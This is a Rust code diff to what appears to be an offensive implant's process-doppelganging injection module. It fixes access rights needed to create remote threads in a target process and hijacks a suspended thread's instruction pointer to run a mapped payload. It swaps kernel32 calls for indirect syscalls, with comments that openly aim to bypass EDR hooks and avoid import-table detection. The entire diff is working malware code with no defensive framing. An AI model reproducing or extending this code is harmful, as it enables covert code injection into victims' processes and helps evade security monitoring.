@@ -89,8 +89,13 @@ const FILE_ATTRIBUTE_NORMAL: u32 = 0x0000_0080;
 /// OBJ_CASE_INSENSITIVE — case-insensitive object name comparison.
 const OBJ_CASE_INSENSITIVE: u32 = 0x0000_0040;
 
-/// Minimal process access mask for NtOpenProcess (VM_WRITE | VM_OPERATION | CREATE_THREAD).
-const MINIMAL_PROCESS_ACCESS: u32 = 0x0028;
+/// Minimal process access mask for NtOpenProcess.
+///
+/// PROCESS_VM_WRITE (0x0020) | PROCESS_VM_OPERATION (0x0008) | PROCESS_CREATE_THREAD (0x0002)
+///
+/// P2-36: PROCESS_CREATE_THREAD was previously missing (was 0x0028).  It is
+/// required for NtCreateThreadEx to create a remote thread in the target.
+const MINIMAL_PROCESS_ACCESS: u32 = 0x002A;
 
 /// CREATE_SUSPENDED flag for CreateProcessW.
 const CREATE_SUSPENDED: u32 = 0x00000004;
@@ -99,22 +104,10 @@ const CREATE_SUSPENDED: u32 = 0x00000004;
 const CONTEXT_FULL: u32 = 0x0010000B;
 
 // ── pe_resolve helpers ──────────────────────────────────────────────────
-
-/// Compile-time djb2 hash for ASCII strings (matches pe_resolve::hash_str).
-const fn hash_str_const(s: &[u8]) -> u32 {
-    let mut h: u32 = pe_resolve::SEED;
-    let mut i = 0;
-    while i < s.len() {
-        h = h.wrapping_mul(31).wrapping_add(s[i] as u32);
-        i += 1;
-    }
-    h
-}
+use crate::pe_resolve_macros::hash_str_const;
 
 // API name hashes.
 const HASH_CREATEPROCESSW: u32 = hash_str_const(b"CreateProcessW\0");
-const HASH_GETTHREADCONTEXT: u32 = hash_str_const(b"GetThreadContext\0");
-const HASH_SETTHREADCONTEXT: u32 = hash_str_const(b"SetThreadContext\0");
 const HASH_GETLASTERROR: u32 = hash_str_const(b"GetLastError\0");
 
 // Function pointer types.
@@ -122,8 +115,6 @@ type FnCreateProcessW = unsafe extern "system" fn(
     *const u16, *mut u16, *mut c_void, *mut c_void, i32, u32,
     *mut c_void, *const u16, *mut c_void, *mut c_void,
 ) -> i32;
-type FnGetThreadContext = unsafe extern "system" fn(*mut c_void, *mut winapi::um::winnt::CONTEXT) -> i32;
-type FnSetThreadContext = unsafe extern "system" fn(*mut c_void, *const winapi::um::winnt::CONTEXT) -> i32;
 type FnGetLastError = unsafe extern "system" fn() -> u32;
 
 /// Resolve a function pointer from kernel32.dll.
@@ -740,8 +731,8 @@ unsafe fn open_target_process(pid: u32) -> Result<usize, String> {
     let mut client_id = [0u64; 2];
     client_id[0] = pid as u64;
 
-    let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
-    obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+    let mut obj_attr: crate::win_types::OBJECT_ATTRIBUTES = std::mem::zeroed();
+    obj_attr.length = std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;
 
     let mut h_proc: usize = 0;
     let status = syscall!(
@@ -770,8 +761,26 @@ unsafe fn open_target_process(pid: u32) -> Result<usize, String> {
 ///
 /// Used when no target process is specified. The process is created in a
 /// suspended state so we can inject before any legitimate code runs.
+///
+/// # EDR Hook Risk (P2-24)
+///
+/// This function resolves `CreateProcessW` from kernel32 via `pe_resolve`
+/// (no static IAT entry), but `kernel32!CreateProcessW` is a common EDR
+/// hook target.  Many EDR products place inline hooks on this function to
+/// intercept process creation for behavioural analysis.
+///
+/// A more OPSEC-safe approach would be to use `NtCreateUserProcess` via
+/// indirect syscall (resolved from a clean ntdll mapping), which bypasses
+/// kernel32 hooks entirely.  That is a larger refactoring effort because
+/// `NtCreateUserProcess` requires manually constructing the `RTL_USER_PROCESS_PARAMETERS`
+/// and `PS_CREATE_INFO` structures that `CreateProcessW` normally handles.
+///
+/// For now, the `pe_resolve` approach is acceptable — it avoids IAT entries
+/// and works against hook implementations that only check the IAT.  Full
+/// `NtCreateUserProcess` support should be considered for a future hardening
+/// pass.
 unsafe fn create_suspended_process() -> Result<(usize, usize, u32), String> {
-    use winapi::um::processthreadsapi::{PROCESS_INFORMATION, STARTUPINFOW};
+    use crate::win_types::{PROCESS_INFORMATION, STARTUPINFOW};
 
     let create_proc_w: FnCreateProcessW = unsafe {
         resolve_kernel32(HASH_CREATEPROCESSW)?
@@ -814,9 +823,9 @@ unsafe fn create_suspended_process() -> Result<(usize, usize, u32), String> {
         ));
     }
 
-    let pid = proc_info.dwProcessId;
-    let process_handle = proc_info.hProcess as usize;
-    let thread_handle = proc_info.hThread as usize;
+    let pid = proc_info.dw_process_id;
+    let process_handle = proc_info.h_process as usize;
+    let thread_handle = proc_info.h_thread as usize;
 
     log::debug!(
         "injection_doppelganging: created suspended process pid={}",
@@ -880,35 +889,46 @@ unsafe fn execute_payload(
 }
 
 /// Redirect a suspended thread's RIP to the payload address.
+///
+/// Uses `NtGetContextThread` / `NtSetContextThread` via indirect syscall
+/// instead of kernel32 `GetThreadContext` / `SetThreadContext` to avoid
+/// EDR hooks on those common interception points (P2-25).
+///
+/// P2-37: Uses `crate::win_types::CONTEXT`, a local `#[repr(C)]` struct
+/// matching the Windows x86_64 CONTEXT layout.  No winapi dependency —
+/// avoids pulling winapi::um::winnt::CONTEXT which would create linker
+/// dependencies on the winapi crate's advapi32/kernel32 stubs.
 unsafe fn redirect_thread(thread_handle: usize, payload_addr: usize) -> Result<(), String> {
-    use winapi::um::winnt::CONTEXT;
-
-    let get_thread_ctx: FnGetThreadContext = unsafe {
-        resolve_kernel32(HASH_GETTHREADCONTEXT)?
-    };
-    let set_thread_ctx: FnSetThreadContext = unsafe {
-        resolve_kernel32(HASH_SETTHREADCONTEXT)?
-    };
-    let get_last_error: FnGetLastError = unsafe {
-        resolve_kernel32(HASH_GETLASTERROR)?
-    };
+    use crate::win_types::CONTEXT;
 
     let mut ctx: CONTEXT = std::mem::zeroed();
-    ctx.ContextFlags = CONTEXT_FULL;
+    ctx.context_flags = crate::win_types::CONTEXT_FULL;
 
-    if get_thread_ctx(thread_handle as *mut c_void, &mut ctx) == 0 {
+    // NtGetContextThread(ThreadHandle, pContext)
+    let status = syscall!(
+        "NtGetContextThread",
+        thread_handle as u64,
+        &mut ctx as *mut CONTEXT as u64,
+    );
+    if status.is_err() || status.unwrap() < 0 {
         return Err(format!(
-            "GetThreadContext failed (error: {})",
-            unsafe { get_last_error() }
+            "NtGetContextThread failed: status={:?}",
+            status
         ));
     }
 
-    ctx.Rip = payload_addr as u64;
+    ctx.rip = payload_addr as u64;
 
-    if set_thread_ctx(thread_handle as *mut c_void, &ctx) == 0 {
+    // NtSetContextThread(ThreadHandle, pContext)
+    let status = syscall!(
+        "NtSetContextThread",
+        thread_handle as u64,
+        &ctx as *const CONTEXT as u64,
+    );
+    if status.is_err() || status.unwrap() < 0 {
         return Err(format!(
-            "SetThreadContext failed (error: {})",
-            unsafe { get_last_error() }
+            "NtSetContextThread failed: status={:?}",
+            status
         ));
     }
 
@@ -1079,6 +1099,36 @@ pub unsafe fn doppelganging_inject(
         "injection_doppelganging: payload mapped at {:#x} in target pid={}",
         remote_base, pid
     );
+
+    // P3-14: Flush instruction cache after section mapping.
+    //
+    // On x86/x64 the instruction cache is coherent with data writes, so
+    // NtFlushInstructionCache is a no-op.  On ARM64 (Windows on ARM) or
+    // certain virtualized environments with split TLBs, stale cached
+    // instructions may be executed without this flush.  Non-fatal: log
+    // and continue regardless of return value.
+    {
+        let flush_status = syscall!(
+            "NtFlushInstructionCache",
+            process_handle as u64,
+            remote_base as u64,
+            0u64  // 0 = flush entire range; view_size not readily available here
+        );
+        match flush_status {
+            Ok(s) if s < 0 => {
+                log::warn!(
+                    "injection_doppelganging: NtFlushInstructionCache returned 0x{:08X} (non-fatal on x64)",
+                    s as u32
+                );
+            }
+            Err(_) => {
+                log::debug!(
+                    "injection_doppelganging: NtFlushInstructionCache syscall not available"
+                );
+            }
+            _ => {} // success (status >= 0)
+        }
+    }
 
     // Close section handle — the target has a mapping that references it.
     let _ = syscall!("NtClose", h_section as u64);
